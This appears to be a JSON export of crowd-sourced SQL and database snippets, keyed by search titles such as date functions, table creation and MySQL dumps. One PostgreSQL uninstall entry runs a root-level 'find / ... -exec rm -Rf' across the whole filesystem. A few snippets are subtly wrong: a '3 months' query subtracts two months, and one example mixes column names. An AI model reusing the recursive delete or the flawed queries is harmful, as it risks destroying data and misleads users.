FirstName varchar(255),     Address varchar(255),     City varchar(255) );\n//to create a table CREATE TABLE students ( student_id number(4) primary key,   last_name varchar2(30) NOT NULL,   course_id number(4) NULL );  //to insert value INSERT INTO students VALUES (200, 'Jones', 101); INSERT INTO students VALUES (201, 'Smith', 101); INSERT INTO students VALUE (202, 'Lee' , 102);    \n",
    "reg_date": "2021-10-12T09:54:48.000Z"
  },
  {
    "id": 734,
    "keyword": null,
    "link": null,
    "title": " creating table in MySQL",
    "description": "# Creates a Simple User table # Uses an auto-incrementing primary key as userId   CREATE TABLE user (     userId INT NOT NULL AUTO_INCREMENT PRIMARY KEY,     username VARCHAR(100),     password VARCHAR(100)  ) ENGINE=InnoDB;\nCREATE TABLE IF NOT EXISTS tasks (     task_id INT AUTO_INCREMENT PRIMARY KEY,     title VARCHAR(255) NOT NULL,     start_date DATE,     due_date DATE,     status TINYINT NOT NULL,     priority TINYINT NOT NULL,     description TEXT,     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP )  ENGINE=INNODB; \ncreate table tutorials_tbl(    tutorial_id INT NOT NULL AUTO_INCREMENT,    tutorial_title VARCHAR(100) NOT NULL,    tutorial_author VARCHAR(40) NOT NULL,    submission_date DATE,    PRIMARY KEY ( tutorial_id ) ); \n# updated dec 2020 # Creates a Simple User table # Uses an auto-incrementing primary key as userId   CREATE TABLE user (     userId INT NOT NULL AUTO_INCREMENT PRIMARY KEY,     username VARCHAR(100),     password VARCHAR(100)  ) ENGINE=InnoDB;\ncreate table tutorials_tbl(    tutorial_id INT NOT NULL AUTO_INCREMENT,    tutorial_title VARCHAR(100) NOT NULL,    tutorial_author VARCHAR(40) NOT NULL,    submission_date DATE,    PRIMARY KEY ( tutorial_id ) );\n#Assuming that there is a database called MyDatabase #creates a table called TableName, with columns Name, Age, and Class Use MyDatabase; create table TableName(   No. int primary key,   Name varchar(50),   Age int,   Class varchar(15));\n",
    "reg_date": "2021-10-12T09:54:48.000Z"
  },
  {
    "id": 735,
    "keyword": null,
    "link": null,
    "title": " creation d'un trigger sql",
    "description": " CREATE OR REPLACE TRIGGER trigg_example  BEFORE INSERT OR UPDATE ON table_example  FOR EACH ROW  WHEN (new.no_line > 0)  DECLARE      evol_exemple number;  BEGIN      evol_exemple := :new.exemple  - :old.exemple;      DBMS_OUTPUT.PUT_LINE('  evolution : ' || evol_exemple);  END;\n",
    "reg_date": "2021-10-12T09:54:48.000Z"
  },
  {
    "id": 736,
    "keyword": null,
    "link": null,
    "title": " crontab every month",
    "description": "// &ldquo;At 00:00 on day-of-month 1.&rdquo; 0 0 1 * *\n",
    "reg_date": "2021-10-12T09:54:48.000Z"
  },
  {
    "id": 737,
    "keyword": null,
    "link": null,
    "title": " cross schema query oracle 2 users",
    "description": "-- Most likely, you need your DBA to grant user A access to whatever tables in the PCT schema that you need. Something like: GRANT SELECT ON pct.pi_int TO a;\n",
    "reg_date": "2021-10-12T09:54:49.000Z"
  },
  {
    "id": 738,
    "keyword": null,
    "link": null,
    "title": " crud sql",
    "description": "CRUD is an acronym that stands for CREATE, READ, UPDATE, and DELETE.  These are the four most basic operations that can be performed with most traditional database systems and they are the backbone for interacting with any database. \n",
    "reg_date": "2021-10-12T09:54:49.000Z"
  },
  {
    "id": 739,
    "keyword": null,
    "link": null,
    "title": " csv into data postgres",
    "description": "COPY table_name FROM 'C:\\Users\\Public\\Documents\\ert.txt' DELIMITER ',' CSV -- make sure to put the file in public folder in windows  -- Or temp folder in linux/mac  -- because it might ask for some permissions... \ncopy table from '/home/usama/Documents/columns_rearrange.csv' csv header ;\n",
    "reg_date": "2021-10-12T09:54:49.000Z"
  },
  {
    "id": 740,
    "keyword": null,
    "link": null,
    "title": " csv to sqlite python",
    "description": "import csv, sqlite3  con = sqlite3.connect(\":memory:\") # change to 'sqlite:///your_filename.db' cur = con.cursor() cur.execute(\"CREATE TABLE t (col1, col2);\") # use your column names here  with open('data.csv','r') as fin: # `with` statement available in 2.5+     # csv.DictReader uses first line in file for column headings by default     dr = csv.DictReader(fin) # comma is default delimiter     to_db = [(i['col1'], i['col2']) for i in dr]  cur.executemany(\"INSERT INTO t (col1, col2) VALUES (?, ?);\", to_db) con.commit() con.close() \n",
    "reg_date": "2021-10-12T09:54:49.000Z"
  },
  {
    "id": 741,
    "keyword": null,
    "link": null,
    "title": " current date in postgresql minus 1 day",
    "description": "--yesterday SELECT NOW() - INTERVAL '1 DAY';  --Unrelated to the question, but PostgreSQL also supports some shortcuts: SELECT 'yesterday'::TIMESTAMP, 'tomorrow'::TIMESTAMP, 'allballs'::TIME;\nCURRENT_DATE-INTERVAL '1 DAY'\n",
    "reg_date": "2021-10-12T09:54:49.000Z"
  },
  {
    "id": 742,
    "keyword": null,
    "link": null,
    "title": " current date in sql",
    "description": "In MySQL the CURDATE() returns the current date in 'YYYY-MM-DD' format or 'YYYYMMDD' format depending on whether numeric or string is used in the function. CURRENT_DATE and CURRENT_DATE() are the synonym of CURDATE()\nGETDATE() \nSELECT getdate(); -- Get Current date in SQL Server\nSELECT NOW(); It returns current date and time.\nINSERT INTO my_table (last_updated) VALUES(NOW()); INSERT INTO my_table (last_updated) VALUES(sysdate);\t-- Oracle INSERT INTO my_table (last_updated) VALUES(getdate());\t-- SQL Server\nSELECT CURRENT_DATE from dual;\n",
    "reg_date": "2021-10-12T09:54:49.000Z"
  },
  {
    "id": 743,
    "keyword": null,
    "link": null,
    "title": " current date sql",
    "description": "In MySQL the CURDATE() returns the current date in 'YYYY-MM-DD' format or 'YYYYMMDD' format depending on whether numeric or string is used in the function. CURRENT_DATE and CURRENT_DATE() are the synonym of CURDATE()\nSELECT getdate(); -- Get Current date in SQL Server\nINSERT INTO my_table (last_updated) VALUES(NOW()); INSERT INTO my_table (last_updated) VALUES(sysdate);\t-- Oracle INSERT INTO my_table (last_updated) VALUES(getdate());\t-- SQL Server\nGETDATE()\nAdd GETDATE() in sql query where you want to pass current timestamp.  Example Return the current database system date and time:  SELECT GETDATE();\nNOW()\n",
    "reg_date": "2021-10-12T09:54:49.000Z"
  },
  {
    "id": 744,
    "keyword": null,
    "link": null,
    "title": " current year sql",
    "description": "select year(getdate())\n-- Oracle SELECT extract(YEAR FROM sysdate) FROM dual;\t\t\t// number SELECT to_char(sysdate, 'YYYY') FROM dual;\t\t\t\t// varchar\n",
    "reg_date": "2021-10-12T09:54:49.000Z"
  },
  {
    "id": 745,
    "keyword": null,
    "link": null,
    "title": " current year sql oracle",
    "description": "SELECT extract(YEAR FROM sysdate) FROM dual;\t\t\t// number SELECT to_char(sysdate, 'YYYY') FROM dual;\t\t\t\t// varchar\n",
    "reg_date": "2021-10-12T09:54:49.000Z"
  },
  {
    "id": 746,
    "keyword": null,
    "link": null,
    "title": " cursor oracle",
    "description": "  FOR b IN (SELECT *                FROM sometable)   LOOP     <<do something   b.somevalue>>   END LOOP;\n",
    "reg_date": "2021-10-12T09:54:49.000Z"
  },
  {
    "id": 747,
    "keyword": null,
    "link": null,
    "title": " customer using hdfc bank sql query",
    "description": "select distinct u.name, u.address from users u join bookingdetails b on b.user_id = u.user_id where u.user_id not in  ( select user_id from bookingdetails where name='HDFC') order by u.name;\n",
    "reg_date": "2021-10-12T09:54:49.000Z"
  },
  {
    "id": 748,
    "keyword": null,
    "link": null,
    "title": " désinstaller postgresql linux",
    "description": "sudo aptitude purge postgresql postgresql-common sudo dpkg -P postgresql-8.4  sudo find / -name postgresql -exec rm -Rf {} \\; sudo find / -name pgsql -exec rm -Rf {} \\; sudo find / -name psql -exec rm -Rf {} \\;  sudo userdel postgres \n",
    "reg_date": "2021-10-12T09:54:50.000Z"
  },
  {
    "id": 749,
    "keyword": null,
    "link": null,
    "title": " data directory postgresql",
    "description": "show data_directory;\n",
    "reg_date": "2021-10-12T09:54:50.000Z"
  },
  {
    "id": 750,
    "keyword": null,
    "link": null,
    "title": " data transfer between tables in sql",
    "description": "Let&rsquo;s assume that, we have our employee table. We have to copy this data into another table. For this purpose, we can use the INSERT INTO SELECT operator. Before we go ahead and do that, we would have to create another table that would have the same structure as the given table. &bull; First create the second table with the same table structure with copied one. &bull; Then use the syntax: Let&rsquo;s say employee_duplicate is New table employee is First table that we want to copy it into new table  INSERT INTO employee_duplicate SELECT * FROM employee;\n",
    "reg_date": "2021-10-12T09:54:50.000Z"
  },
  {
    "id": 751,
    "keyword": null,
    "link": null,
    "title": " data types in sql",
    "description": "# Numeric Types BIT\tTINYINT SMALLINT INT BIGINT DECIMAL NUMERIC FLOAT REAL  # Date & Time Types DATE TIME DATETIME TIMESTAMP YEAR  # Char & String Types (N) Denotes Unicode Versions CHAR VARCHAR TEXT NCHAR NVARCHAR NTEXT  # Binary Data Types BINARY VARBINARY IMAGE  # Misc CLOB BLOB XML JSON\n&bull; number(num) - whole numbers up to num digits &bull; number(num,num2) - num whole numbers up to num2 decimals &bull; char(num) - fixed length character/string &bull; varchar2(num) - used for varying length data &bull; date - full date &bull; currency - used for prices \n-- Text Data Types: CHAR(size) Fixed length string which can contain letters, numbers and special characters. The size parameter sets the maximum string length, from 0 &ndash; 255 with a default of 1. VARCHAR(size) Variable length string similar to CHAR(), but with a maximum string length range from 0 to 65535. BINARY(size) Similar to CHAR() but stores binary byte strings. VARBINARY(size) Similar to VARCHAR() but for binary byte strings. TINYBLOB Holds Binary Large Objects (BLOBs) with a max length of 255 bytes. TINYTEXT Holds a string with a maximum length of 255 characters. Use VARCHAR() instead, as it&rsquo;s fetched much faster. TEXT(size) Holds a string with a maximum length of 65535 bytes. Again, better to use VARCHAR(). BLOB(size) Holds Binary Large Objects (BLOBs) with a max length of 65535 bytes. MEDIUMTEXT Holds a string with a maximum length of 16,777,215 characters. MEDIUMBLOB Holds Binary Large Objects (BLOBs) with a max length of 16,777,215 bytes. LONGTEXT Holds a string with a maximum length of 4,294,967,295 characters. LONGBLOB Holds Binary Large Objects (BLOBs) with a max length of 4,294,967,295 bytes. ENUM(a, b, c, etc&hellip;) A string object that only has one value, which is chosen from a list of values which you define, up to a maximum of 65535 values. If a value is added which isn&rsquo;t on this list, it&rsquo;s replaced with a blank value instead. Think of ENUM being similar to HTML radio boxes in this regard. CREATE TABLE tshirts (color ENUM(&lsquo;red&rsquo;, &lsquo;green&rsquo;, &lsquo;blue&rsquo;, &lsquo;yellow&rsquo;, &lsquo;purple&rsquo;)); SET(a, b, c, etc&hellip;) A string object that can have 0 or more values, which is chosen from a list of values which you define, up to a maximum of 64 values. Think of SET being similar to HTML checkboxes in this regard.\nSELECT TYPEOF(value);\n-- Numeric Data Types: BIT(size) A bit-value type with a default of 1. The allowed number of bits in a value is set via the size parameter, which can hold values from 1 to 64. TINYINT(size) A very small integer with a signed range of -128 to 127, and an unsigned range of 0 to 255. Here, the size parameter specifies the maximum allowed display width, which is 255. BOOL Essentially a quick way of setting the column to TINYINT with a size of 1. 0 is considered false, whilst 1 is considered true. BOOLEAN Same as BOOL. SMALLINT(size) A small integer with a signed range of -32768 to 32767, and an unsigned range from 0 to 65535. Here, the size parameter specifies the maximum allowed display width, which is 255. MEDIUMINT(size) A medium integer with a signed range of -8388608 to 8388607, and an unsigned range from 0 to 16777215. Here, the size parameter specifies the maximum allowed display width, which is 255. INT(size) A medium integer with a signed range of -2147483648 to 2147483647, and an unsigned range from 0 to 4294967295. Here, the size parameter specifies the maximum allowed display width, which is 255. INTEGER(size) Same as INT. BIGINT(size) A medium integer with a signed range of -9223372036854775808 to 9223372036854775807, and an unsigned range from 0 to 18446744073709551615. Here, the size parameter specifies the maximum allowed display width, which is 255. FLOAT(p) A floating point number value. If the precision (p) parameter is between 0 to 24, then the data type is set to FLOAT(), whilst if its from 25 to 53, the data type is set to DOUBLE(). This behaviour is to make the storage of values more efficient. DOUBLE(size, d) A floating point number value where the total digits are set by the size parameter, and the number of digits after the decimal point is set by the d parameter. DECIMAL(size, d) An exact fixed point number where the total number of digits is set by the size parameters, and the total number of digits after the decimal point is set by the d parameter. For size, the maximum number is 65 and the default is 10, whilst for d, the maximum number is 30 and the default is 10. DEC(size, d) Same as DECIMAL.\n1- Data Manipulation Language(DML)-(SELECT, INSTERT, UPDATE...) DML statements affect records in table. These are basic operations we perform on data such as selecting few records from a table, inserting new records, deleting unnecessary records, updating existing records.  2-Data Definition Language (CREATE , ALTER , DROP)... DDL statements are used to modify database or table schema. These statements handle the design and storage of database objects.  3-Data Control Language (GRANT , REVOKE)... DCL statements control the level of access that users have on database objects  4- Transaction Control Language (BEGIN TRAN, COMMIT TRAN, ROLLBACK)...  TCL statements allows us to control and manage transactions to maintain the integrity of data withing SQL statements.\n",
    "reg_date": "2021-10-12T09:54:50.000Z"
  },
  {
    "id": 752,
    "keyword": null,
    "link": null,
    "title": " database backup in mysql server recovery",
    "description": "mysql -u [user] -p [database_name] < [filename].sql\n",
    "reg_date": "2021-10-12T09:54:50.000Z"
  },
  {
    "id": 753,
    "keyword": null,
    "link": null,
    "title": " database collation mysql",
    "description": "The main difference is sorting accuracy (when comparing characters in the  language) and performance. The only special one is utf8_bin which is for  comparing characters in binary format.  utf8_general_ci is somewhat faster than utf8_unicode_ci, but less accurate  (for sorting). The specific language utf8 encoding (such as utf8_swedish_ci)  contain additional language rules that make them the most accurate to sort for  those languages. Most of the time I use utf8_unicode_ci (I prefer accuracy to  small performance improvements), unless I have a good reason to prefer a  specific language.  You can read more on specific unicode character sets on the MySQL manual -  http://dev.mysql.com/doc/refman/5.0/en/charset-unicode-sets.html\n",
    "reg_date": "2021-10-12T09:54:50.000Z"
  },
  {
    "id": 754,
    "keyword": null,
    "link": null,
    "title": " database disk image is malformed sqlite fix ubuntu",
    "description": "sqlite3 /path/database.db \"PRAGMA integrity_check;\"\n",
    "reg_date": "2021-10-12T09:54:50.000Z"
  },
  {
    "id": 755,
    "keyword": null,
    "link": null,
    "title": " database dump mysql command",
    "description": "mysqldump -u<user_name> -p<user_password> <database_name> > <file_name>.sql\n#note by specifying -p flag without a password it'll prompt you for pass  DUMP: mysqldump -u username -p dbname --lock-tables=false > filename.sql  Import: mysql -u username -p dbname < filename.sql  Import external: mysql -h host -u username -p dbname < filename.sql \nmysqldump -u username -p dbname > filename.sql\nmysql -u username -p dbname < filename.sql\n",
    "reg_date": "2021-10-12T09:54:51.000Z"
  },
  {
    "id": 756,
    "keyword": null,
    "link": null,
    "title": " database get 10 user aleatory",
    "description": "SELECT      t.customerNumber, t.customerName FROM     customers AS t ORDER BY RAND() LIMIT 5; \n",
    "reg_date": "2021-10-12T09:54:51.000Z"
  },
  {
    "id": 757,
    "keyword": null,
    "link": null,
    "title": " database spring",
    "description": "spring.jpa.hibernate.ddl-auto=update spring.datasource.url=jdbc:mysql://${MYSQL_HOST:localhost}:3306/db_example spring.datasource.username=springuser spring.datasource.password=ThePasswordCopy\n",
    "reg_date": "2021-10-12T09:54:51.000Z"
  },
  {
    "id": 758,
    "keyword": null,
    "link": null,
    "title": " database springboot",
    "description": "spring.jpa.hibernate.ddl-auto=update spring.datasource.url=jdbc:mysql://${MYSQL_HOST:localhost}:3306/db_example spring.datasource.username=springuser spring.datasource.password=ThePasswordCopy\nspring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver spring.datasource.url=jdbc:mysql://localhost:3306/learning-spring spring.datasource.username=root spring.datasource.password= spring.datasource.initialization-mode=always spring.jpa.properties.hibernate.dialect=org.hibernate.dialect.MySQL8Dialect spring.jpa.hibernate.ddl-auto=update\n",
    "reg_date": "2021-10-12T09:54:51.000Z"
  },
  {
    "id": 759,
    "keyword": null,
    "link": null,
    "title": " database timezone",
    "description": "the list of database timezone can be found in the link below  https://en.wikipedia.org/wiki/List_of_tz_database_time_zones\n",
    "reg_date": "2021-10-12T09:54:51.000Z"
  },
  {
    "id": 760,
    "keyword": null,
    "link": null,
    "title": " database types",
    "description": "Relational Database = -Tables are structured related to each other -Each specific type of domain data is strored  it's own table  Non-Relational Database = -There is no relation at all between tables -Mostly key+value pair : like jSon\n",
    "reg_date": "2021-10-12T09:54:51.000Z"
  },
  {
    "id": 761,
    "keyword": null,
    "link": null,
    "title": " database url postgres",
    "description": "DATABASE_URL = \"postgres://YourUserName:YourPassword@localHost:5432/YourDatabaseName\"; \nPG_URI=postgres://postgres:root@localhost:5432/campus\n",
    "reg_date": "2021-10-12T09:54:51.000Z"
  },
  {
    "id": 762,
    "keyword": null,
    "link": null,
    "title": " databricks install odbc driver connect to sql server",
    "description": "%sh curl https://packages.microsoft.com/keys/microsoft.asc | apt-key add - curl https://packages.microsoft.com/config/ubuntu/16.04/prod.list > /etc/apt/sources.list.d/mssql-release.list sudo apt-get update sudo ACCEPT_EULA=Y apt-get -q -y install msodbcsql17 \n",
    "reg_date": "2021-10-12T09:54:51.000Z"
  },
  {
    "id": 763,
    "keyword": null,
    "link": null,
    "title": " datagrip exec",
    "description": "-- Instead of 'exec' in SQL Developer call MY_SCHEMA.my_procedure(); -- Shorter than : BEGIN \tMY_SCHEMA.my_procedure(); END;\n",
    "reg_date": "2021-10-12T09:54:51.000Z"
  },
  {
    "id": 764,
    "keyword": null,
    "link": null,
    "title": " datagrip execute procedure",
    "description": "-- Instead of 'exec' in SQL Developer call MY_SCHEMA.my_procedure(); -- Shorter than : BEGIN \tMY_SCHEMA.my_procedure(); END;\n",
    "reg_date": "2021-10-12T09:54:51.000Z"
  },
  {
    "id": 765,
    "keyword": null,
    "link": null,
    "title": " datatables server side filter where clause",
    "description": "SSP::complex( $_GET, $sql_details, $table, $primaryKey, $columns, null, \"office = 'London'\" )\n",
    "reg_date": "2021-10-12T09:54:51.000Z"
  },
  {
    "id": 766,
    "keyword": null,
    "link": null,
    "title": " date 3 months from today sql",
    "description": "SELECT * FROM MyTable WHERE MyDate < DATEADD(month, -2, GETDATE()) \n",
    "reg_date": "2021-10-12T09:54:52.000Z"
  },
  {
    "id": 767,
    "keyword": null,
    "link": null,
    "title": " date between in mysql",
    "description": "ex1: SELECT * FROM `objects`  WHERE  (date_field BETWEEN '2010-01-30 14:15:55' AND '2010-09-29 10:15:55')  ex2: WHERE     requireddate BETWEEN       CAST('2003-01-01' AS DATE) AND       CAST('2003-01-31' AS DATE);\nselect * from hockey_stats  where game_date between '2012-03-11 00:00:00' and '2012-05-11 23:59:00'  order by game_date desc;\n-- With implicit CAST SELECT * FROM my_table  \tWHERE my_date BETWEEN '2021-06-01 01:12:00' AND '2021-06-30 23:59:59'; -- is EQUIVALENT to SELECT * FROM my_table  \tWHERE my_date >= '2021-06-01 01:12:00' AND my_col <= '2021-06-30 23:59:59';\nSELECT * FROM `objects`  WHERE  (date_field BETWEEN '2010-01-30 14:15:55' AND '2010-09-29 10:15:55')\n",
    "reg_date": "2021-10-12T09:54:52.000Z"
  },
  {
    "id": 768,
    "keyword": null,
    "link": null,
    "title": " date conversion in mysql column",
    "description": "MySQL DATE_FORMAT() formats a date as specified in the argument. A list of format specifiers given bellow may be used to format a date. The &lsquo;%&rsquo; is required before the format specifier characters.  Syntax:  DATE_FORMAT(date,format)\n",
    "reg_date": "2021-10-12T09:54:52.000Z"
  },
  {
    "id": 769,
    "keyword": null,
    "link": null,
    "title": " date datatype in livesql",
    "description": "create table this_table_has_three_columns (   this_is_a_character_column varchar2(100),   this_is_a_number_column    number,   this_is_a_date_column      date );\n",
    "reg_date": "2021-10-12T09:54:52.000Z"
  },
  {
    "id": 770,
    "keyword": null,
    "link": null,
    "title": " date datatype in sql",
    "description": "DATE - format YYYY-MM-DD DATETIME - format: YYYY-MM-DD HH:MI:SS TIMESTAMP - format: YYYY-MM-DD HH:MI:SS YEAR - format YYYY or YY\nDATE - format YYYY-MM-DD\n",
    "reg_date": "2021-10-12T09:54:52.000Z"
  },
  {
    "id": 771,
    "keyword": null,
    "link": null,
    "title": " date diff sql",
    "description": "DECLARE      @start_dt DATETIME2= '2019-12-31 23:59:59.9999999',      @end_dt DATETIME2= '2020-01-01 00:00:00.0000000';  SELECT      DATEDIFF(year, @start_dt, @end_dt) diff_in_year,      DATEDIFF(quarter, @start_dt, @end_dt) diff_in_quarter,      DATEDIFF(month, @start_dt, @end_dt) diff_in_month,      DATEDIFF(dayofyear, @start_dt, @end_dt) diff_in_dayofyear,      DATEDIFF(day, @start_dt, @end_dt) diff_in_day,      DATEDIFF(week, @start_dt, @end_dt) diff_in_week,      DATEDIFF(hour, @start_dt, @end_dt) diff_in_hour,      DATEDIFF(minute, @start_dt, @end_dt) diff_in_minute,      DATEDIFF(second, @start_dt, @end_dt) diff_in_second,      DATEDIFF(millisecond, @start_dt, @end_dt) diff_in_millisecond;\nSELECT DATEDIFF(year, '2017/08/25', '2011/08/25') AS DateDiff;\nSELECT (END_DATE - START_DATE) Days-Total FROM MyTable /*this works for oracle sql*/\n",
    "reg_date": "2021-10-12T09:54:52.000Z"
  },
  {
    "id": 772,
    "keyword": null,
    "link": null,
    "title": " date difference in number of days sql server",
    "description": "DECLARE      @start_dt DATETIME2= '2019-12-31 23:59:59.9999999',      @end_dt DATETIME2= '2020-01-01 00:00:00.0000000';  SELECT      DATEDIFF(year, @start_dt, @end_dt) diff_in_year,      DATEDIFF(quarter, @start_dt, @end_dt) diff_in_quarter,      DATEDIFF(month, @start_dt, @end_dt) diff_in_month,      DATEDIFF(dayofyear, @start_dt, @end_dt) diff_in_dayofyear,      DATEDIFF(day, @start_dt, @end_dt) diff_in_day,      DATEDIFF(week, @start_dt, @end_dt) diff_in_week,      DATEDIFF(hour, @start_dt, @end_dt) diff_in_hour,      DATEDIFF(minute, @start_dt, @end_dt) diff_in_minute,      DATEDIFF(second, @start_dt, @end_dt) diff_in_second,      DATEDIFF(millisecond, @start_dt, @end_dt) diff_in_millisecond;\nSELECT t1.OrderNo,DATEDIFF(day,t1.LoadedStartDate,t2.LoadedStartDate) FROM UnnamedTableFromQuestion t1        INNER JOIN      UnnamedTableFromQuestion t2        on          t1.OrderNo = t2.OrderNo WHERE t1.OpNo = 1 and       t2.OpNo = 4        ////////////////////////////////////////////////////////////////  select cur.unique_id_field, cur.seq_no, cur.date_created ,    datediff(second, prv.date_created, cur.date_created) as diff_in_seconds  from yourtable as cur    join yourtable as prv      on cur.seq_no = prv.seq_no + 1;\n",
    "reg_date": "2021-10-12T09:54:52.000Z"
  },
  {
    "id": 773,
    "keyword": null,
    "link": null,
    "title": " date format in oracle",
    "description": "ALTER SESSION SET NLS_DATE_FORMAT = 'DD-MM-YYYY HH24:MI:SS'; SELECT sysdate FROM dual;  SELECT to_char(sysdate,'HH24:MI:SS') FROM dual;\nTO_CHAR (TO_DATE('0297','MM/YY'), 'MM/YY') \n e.g., 01-JAN-17  \n",
    "reg_date": "2021-10-12T09:54:52.000Z"
  },
  {
    "id": 774,
    "keyword": null,
    "link": null,
    "title": " date format in sql",
    "description": "SELECT CONVERT(VARCHAR, GETDATE(),101) AS DATE SELECT CONVERT(VARCHAR, GETDATE(),102) AS DATE SELECT CONVERT(VARCHAR, GETDATE(),103) AS DATE SELECT CONVERT(VARCHAR, GETDATE(),104) AS DATE SELECT CONVERT(VARCHAR, GETDATE(),105) AS DATE SELECT CONVERT(VARCHAR, GETDATE(),106) AS DATE  SELECT DATE = FORMAT(GETDATE(), 'dd-MM-yyyy') \nCast( '2011-07-07' as date ) as convertedDate\nSELECT FORMAT(dbo.column, 'M/dd/yyyy')\nDATE - format YYYY-MM-DD DATETIME - format: YYYY-MM-DD HH:MI:SS TIMESTAMP - format: YYYY-MM-DD HH:MI:SS YEAR - format YYYY or YY\ndefault date format of my sql - YYYY-MM-DD\n",
    "reg_date": "2021-10-12T09:54:52.000Z"
  },
  {
    "id": 775,
    "keyword": null,
    "link": null,
    "title": " date format mysql",
    "description": "DATE_FORMAT(date, format) -- E.g. SELECT DATE_FORMAT(dateField, '%m/%d/%Y') FROM TableName; -- See https://www.mysqltutorial.org/mysql-date_format/ for available formats\n-- Converts 'dd.mm.yyyy' to date\t(my_date_col is VARCHAR) SELECT STR_TO_DATE(my_date_col,'%d.%m.%Y') AS my_strdate FROM my_table; -- Converts 'dd.mm.yyyy' to 'YYYY-MM-DD' SELECT DATE_FORMAT(STR_TO_DATE(my_date_col,'%d.%m.%Y'), '%Y-%m-%d') AS my_strdate \tFROM my_table;\n-- use DATE_FORMAT with %H %i -- SELECT DATE_FORMAT(MemberBookFacility.time, '%H:%i') \"45\": \"09:00\", \"24\": \"10:00\", \"42\": \"11:00\", \"48\": \"12:00\",  -- ONcakephp must use below format $this->virtualFields['time'] = \"DATE_FORMAT(MemberBookFacility.time, '%H:%i')\";\t// using this for use concat \t \t\treturn $this->find('list', array(           'conditions' => $conditions,           'fields' => array(             'MemberBookFacility.id',              'time',           ),           'order' => array(             'MemberBookFacility.time ASC',           ),         ));\nuse \\Datetime;  $now = new DateTime(); echo $now->format('Y-m-d H:i:s');    // MySQL datetime format echo $now->getTimestamp();           // Unix Timestamp -- Since PHP 5.3 \nDECLARE df VARCHAR(20); DECLARE dt VARCHAR(20);  SET df = DATE_FORMAT(_Datefrom,'%Y-%m-%d 00:00:00');  SET dt = DATE_FORMAT(_DateTo,'%Y-%m-%d 23:59:59');\nDATE : stocke une date au format AAAA-MM-JJ (Ann&eacute;e-Mois-Jour) ;  TIME : stocke un moment au format HH:MM:SS (Heures:Minutes:Secondes) ;  DATETIME : stocke la combinaison d'une date et d'un moment de la journ&eacute;e au format AAAA-MM-JJ HH:MM:SS. Ce type de champ est donc plus pr&eacute;cis ;  TIMESTAMP : stocke le nombre de secondes pass&eacute;es depuis le 1er janvier 1970 &agrave; 00 h 00 min 00 s ;  YEAR : stocke une ann&eacute;e, soit au format AA, soit au format AAAA.\n",
    "reg_date": "2021-10-12T09:54:52.000Z"
  },
  {
    "id": 776,
    "keyword": null,
    "link": null,
    "title": " date part mysql",
    "description": "mysql> SELECT EXTRACT(YEAR FROM '2019-07-02');         -> 2019 mysql> SELECT EXTRACT(YEAR_MONTH FROM '2019-07-02 01:02:03');         -> 201907 mysql> SELECT EXTRACT(DAY_MINUTE FROM '2019-07-02 01:02:03');         -> 20102 mysql> SELECT EXTRACT(MICROSECOND     ->                FROM '2003-01-02 10:30:00.000123');         -> 123\n",
    "reg_date": "2021-10-12T09:54:53.000Z"
  },
  {
    "id": 777,
    "keyword": null,
    "link": null,
    "title": " date trunc postgres",
    "description": "SELECT * FROM table WHERE update_date >= '2013-05-03'::date AND update_date < ('2013-05-03'::date + '1 day'::interval);\nSELECT DATE_TRUNC('hour', TIMESTAMP '2017-03-17 02:09:30');\nselect now() - INTERVAL '1 YEAR';\n",
    "reg_date": "2021-10-12T09:54:53.000Z"
  },
  {
    "id": 778,
    "keyword": null,
    "link": null,
    "title": " date vs datetime",
    "description": "DATE : YYYY-MM-DD format DATETIME : YYYY-MM-DD HH:MM:SS format TIMESTAMP : X s from 1970 format TIME : HH:MM:SS format\n",
    "reg_date": "2021-10-12T09:54:53.000Z"
  },
  {
    "id": 779,
    "keyword": null,
    "link": null,
    "title": " datefromparts mssql",
    "description": "DATEFROMPARTS ( year, month, day )  \n",
    "reg_date": "2021-10-12T09:54:53.000Z"
  },
  {
    "id": 780,
    "keyword": null,
    "link": null,
    "title": " datename in sql",
    "description": "SQL Server DATENAME() Function: Return a specified part of a date:  SELECT DATENAME(year, '2017/08/25') AS DatePartString;  Syntax DATENAME(interval, date)  Parameter Values Parameter\tDescription  interval\tRequired. The part to return. Can be one of the following values:  year, yyyy, yy = Year quarter, qq, q = Quarter month, mm, m = month dayofyear = Day of the year day, dy, y = Day week, ww, wk = Week weekday, dw, w = Weekday hour, hh = hour minute, mi, n = Minute second, ss, s = Second millisecond, ms = Millisecond date\tRequired. The date to use  Example: Return a specified part of a date:  SELECT DATENAME(yy, '2017/08/25') AS DatePartString; Example Return a specified part of a date:  SELECT DATENAME(month, '2017/08/25') AS DatePartString; Example Return a specified part of a date:  SELECT DATENAME(hour, '2017/08/25 08:36') AS DatePartString; Example Return a specified part of a date:  SELECT DATENAME(minute, '2017/08/25 08:36') AS DatePartString;\n",
    "reg_date": "2021-10-12T09:54:53.000Z"
  },
  {
    "id": 781,
    "keyword": null,
    "link": null,
    "title": " datepart day of week",
    "description": "SELECT DATENAME(DW,'2007-10-30');  \n",
    "reg_date": "2021-10-12T09:54:53.000Z"
  },
  {
    "id": 782,
    "keyword": null,
    "link": null,
    "title": " datepart postgres",
    "description": "SELECT date_part('day', TIMESTAMP '2001-02-16 20:38:40'); Result: 16  SELECT date_part('hour', INTERVAL '4 hours 3 minutes'); Result: 4\n",
    "reg_date": "2021-10-12T09:54:53.000Z"
  },
  {
    "id": 783,
    "keyword": null,
    "link": null,
    "title": " datetime add 2 hours sql",
    "description": "DATEADD(HOUR, 2, GETUTCDATE())\n",
    "reg_date": "2021-10-12T09:54:53.000Z"
  },
  {
    "id": 784,
    "keyword": null,
    "link": null,
    "title": " datetrunc",
    "description": "SELECT DATE_TRUNC('hour', TIMESTAMP '2017-03-17 02:09:30');\n",
    "reg_date": "2021-10-12T09:54:53.000Z"
  },
  {
    "id": 785,
    "keyword": null,
    "link": null,
    "title": " day of the week sqlite",
    "description": "# See https://www.sqlitetutorial.net/sqlite-date-functions/sqlite-strftime-function/ # for different parts of the date SELECT strftime('%w', date_column)  FROM table_n;\n",
    "reg_date": "2021-10-12T09:54:53.000Z"
  },
  {
    "id": 786,
    "keyword": null,
    "link": null,
    "title": " db.relationship sqlalchemy flask",
    "description": "class Person(db.Model):     id = db.Column(db.Integer, primary_key=True)     name = db.Column(db.String(50), nullable=False)     addresses = db.relationship('Address', backref='person', lazy=True)  class Address(db.Model):     id = db.Column(db.Integer, primary_key=True)     email = db.Column(db.String(120), nullable=False)     person_id = db.Column(db.Integer, db.ForeignKey('person.id'),         nullable=False) \n",
